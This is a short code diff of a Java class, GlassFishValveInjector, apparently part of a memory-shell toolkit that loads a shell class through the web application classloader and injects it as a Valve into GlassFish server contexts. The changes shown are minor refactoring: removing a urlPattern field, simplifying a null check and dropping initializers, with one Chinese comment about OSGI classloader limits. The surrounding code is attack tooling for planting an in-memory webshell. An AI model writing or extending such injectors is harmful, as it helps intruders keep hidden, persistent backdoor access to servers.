@@ -14,11 +14,10 @@ import java.util.zip.GZIPInputStream;
 public class GlassFishValveInjector {
 
 
-    private static boolean ok = false;
+    private static boolean ok;
 
     private static String shellClassName;
     private static String shellClass;
-    private static String urlPattern;
 
     public GlassFishValveInjector() {
         if (ok) {
@@ -30,9 +29,7 @@ public class GlassFishValveInjector {
         } catch (Throwable throwable) {
             
         }
-        if (contexts == null || contexts.isEmpty()) {
-         
-        } else {
+        if (contexts != null) {
             for (Object context : contexts) {
                 try {
                     
@@ -47,7 +44,6 @@ public class GlassFishValveInjector {
         ok = true;
         shellClass = null;
         shellClassName = null;
-        urlPattern = null;
  
     }
 
@@ -80,7 +76,7 @@ public class GlassFishValveInjector {
     private Object getShell(Object context) throws Exception {
         // OSGI 类加载限制，加密相关函数找不到，这儿不得不使用 WebAppClassLoader
         ClassLoader classLoader = getWebAppClassLoader(context);
-        Class<?> clazz = null;
+        Class<?> clazz;
         try {
             clazz = classLoader.loadClass(shellClassName);
         } catch (Exception e) {
